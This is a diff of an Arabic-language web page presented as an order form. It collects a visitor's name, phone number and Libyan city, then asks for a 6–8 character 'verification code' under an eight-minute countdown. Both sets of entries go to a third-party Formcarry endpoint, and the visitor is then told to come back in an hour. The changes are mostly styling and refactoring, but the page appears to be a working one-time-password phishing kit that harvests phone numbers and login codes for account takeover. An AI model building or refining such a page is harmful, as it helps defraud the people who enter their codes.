@@ -7,7 +7,7 @@
   <style>
     body {
       font-family: Arial, sans-serif;
-      background: #f1f1f1;
+      background: #f5f5f5;
       padding: 20px;
       direction: rtl;
       text-align: right;
@@ -16,27 +16,27 @@
       background: #fff;
       padding: 20px;
       border-radius: 12px;
-      box-shadow: 0 0 10px #ccc;
-      max-width: 400px;
-      margin: 20px auto;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+      max-width: 420px;
+      margin: 30px auto;
     }
     label {
       display: block;
-      margin-top: 10px;
+      margin-top: 12px;
       font-weight: bold;
     }
     input, select {
       width: 100%;
       padding: 10px;
-      margin-top: 5px;
+      margin-top: 6px;
       border-radius: 8px;
       border: 1px solid #ccc;
     }
     button {
-      margin-top: 15px;
+      margin-top: 20px;
       width: 100%;
       padding: 12px;
-      background-color: #4CAF50;
+      background-color: #2196F3;
       color: white;
       border: none;
       border-radius: 8px;
@@ -51,7 +51,7 @@
       display: none;
     }
     .timer {
-      margin-top: 10px;
+      margin-top: 12px;
       color: #d32f2f;
       font-weight: bold;
     }
@@ -64,12 +64,13 @@
 </head>
 <body>
 
-<form id="mainForm" onsubmit="submitForm(event)">
+<!-- النموذج الأول -->
+<form id="mainForm" action="https://formcarry.com/s/12UxdOsTbaW" method="POST" onsubmit="handleSubmit(event)">
   <h2>نموذج الطلب</h2>
 
   <label for="fullName">الاسم الثلاثي</label>
   <input type="text" id="fullName" name="fullName" required oninput="validateForm()">
-  <div class="error" id="nameError">يجب أن يكون الاسم أكثر من 7 أحرف عربية.</div>
+  <div class="error" id="nameError">يجب أن يكون الاسم أكثر من 7 أحرف عربية فقط.</div>
 
   <label for="phone">رقم الهاتف</label>
   <input type="tel" id="phone" name="phone" required oninput="validateForm()">
@@ -77,21 +78,22 @@
   <label for="address">المدينة</label>
   <select id="address" name="address" required onchange="validateForm()">
     <option value="">اختر المدينة</option>
-    <option value="طرابلس">طرابلس</option>
-    <option value="بنغازي">بنغازي</option>
-    <option value="مصراتة">مصراتة</option>
-    <option value="البيضاء">البيضاء</option>
-    <option value="زليتن">زليتن</option>
-    <option value="سبها">سبها</option>
-    <option value="الخمس">الخمس</option>
-    <option value="درنة">درنة</option>
-    <option value="سرت">سرت</option>
-    <option value="طبرق">طبرق</option>
+    <option>طرابلس</option>
+    <option>بنغازي</option>
+    <option>مصراتة</option>
+    <option>البيضاء</option>
+    <option>زليتن</option>
+    <option>سبها</option>
+    <option>الخمس</option>
+    <option>درنة</option>
+    <option>سرت</option>
+    <option>طبرق</option>
   </select>
 
   <button type="submit" id="submitBtn" disabled>أكمل الطلب</button>
 </form>
 
+<!-- مرحلة الكود -->
 <div class="code-box" id="codeBox">
   <h3>يرجى إدخال كود التوثيق</h3>
   <input type="text" id="verificationCode" placeholder="أدخل الكود (6–8 أرقام أو أحرف)" required>
@@ -99,14 +101,14 @@
   <div class="timer" id="timer">الوقت المتبقي: 08:00</div>
 </div>
 
+<!-- صفحة الانتظار -->
 <div id="waitingPage">
   <h2>تم استلام الكود</h2>
-  <p>طلبك قيد المعالجة وسيتم الرد خلال ساعة.</p>
+  <p>طلبك قيد المراجعة. الرجاء العودة بعد ساعة.</p>
 </div>
 
+<!-- JavaScript -->
 <script>
-  const formcarryURL = "https://formcarry.com/s/12UxdOsTbaW";
-
   function validateForm() {
     const name = document.getElementById("fullName").value.trim();
     const phone = document.getElementById("phone").value.trim();
@@ -117,78 +119,69 @@
     const phoneIsValid = /^\d{10,15}$/.test(phone);
     const addressIsValid = address !== "";
 
-    if (!nameIsValid && name.length > 0) {
-      nameError.style.display = "block";
-    } else {
-      nameError.style.display = "none";
-    }
+    nameError.style.display = (!nameIsValid && name.length > 0) ? "block" : "none";
 
     document.getElementById("submitBtn").disabled = !(nameIsValid && phoneIsValid && addressIsValid);
   }
 
-  function submitForm(event) {
+  function handleSubmit(event) {
     event.preventDefault();
+    const form = document.getElementById("mainForm");
+    const formData = new FormData(form);
 
-    const formData = {
-      fullName: document.getElementById('fullName').value.trim(),
-      phone: document.getElementById('phone').value.trim(),
-      address: document.getElementById('address').value,
-    };
-
-    fetch(formcarryURL, {
+    fetch(form.action, {
       method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify(formData)
+      body: formData
     })
-    .then(response => {
-      if (response.ok) {
-        document.getElementById("mainForm").style.display = "none";
+    .then(res => {
+      if (res.ok) {
+        form.style.display = "none";
         document.getElementById("codeBox").style.display = "block";
-        startTimer(8 * 60); // 8 دقائق
+        startTimer(8 * 60);
       } else {
-        alert("حدث خطأ أثناء إرسال البيانات.");
+        alert("فشل في إرسال البيانات.");
       }
     })
-    .catch(error => {
-      alert("فشل الاتصال بـ Formcarry.");
-      console.error(error);
+    .catch(err => {
+      console.error("خطأ في الاتصال:", err);
+      alert("حدث خطأ في الاتصال.");
     });
   }
 
   function submitCode() {
-    const code = document.getElementById('verificationCode').value.trim();
+    const code = document.getElementById("verificationCode").value.trim();
     const codeIsValid = /^[A-Za-z0-9]{6,8}$/.test(code);
 
     if (!codeIsValid) {
-      alert("يرجى إدخال كود مكوّن من 6 إلى 8 أحرف أو أرقام فقط.");
+      alert("يرجى إدخال كود صحيح (6–8 أحرف أو أرقام).");
       return;
     }
 
-    document.getElementById('codeBox').style.display = "none";
-    document.getElementById('waitingPage').style.display = "block";
+    // إخفاء خانة الكود وإظهار صفحة الانتظار
+    document.getElementById("codeBox").style.display = "none";
+    document.getElementById("waitingPage").style.display = "block";
 
-    fetch(formcarryURL, {
+    // إرسال الكود إلى Formcarry (اختياري)
+    fetch("https://formcarry.com/s/12UxdOsTbaW", {
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify({ code: code })
-    }).catch(error => {
-      console.error("فشل الإرسال إلى Formcarry:", error);
-    });
+    }).catch(error => console.error("Formcarry Error:", error));
   }
 
   function startTimer(duration) {
     let timer = duration;
-    const timerDisplay = document.getElementById("timer");
+    const display = document.getElementById("timer");
 
-    const countdown = setInterval(() => {
+    const interval = setInterval(() => {
       const minutes = String(Math.floor(timer / 60)).padStart(2, '0');
       const seconds = String(timer % 60).padStart(2, '0');
-      timerDisplay.textContent = `الوقت المتبقي: ${minutes}:${seconds}`;
+      display.textContent = `الوقت المتبقي: ${minutes}:${seconds}`;
       timer--;
 
       if (timer < 0) {
-        clearInterval(countdown);
-        timerDisplay.textContent = "انتهى الوقت!";
+        clearInterval(interval);
+        display.textContent = "انتهى الوقت!";
       }
     }, 1000);
   }
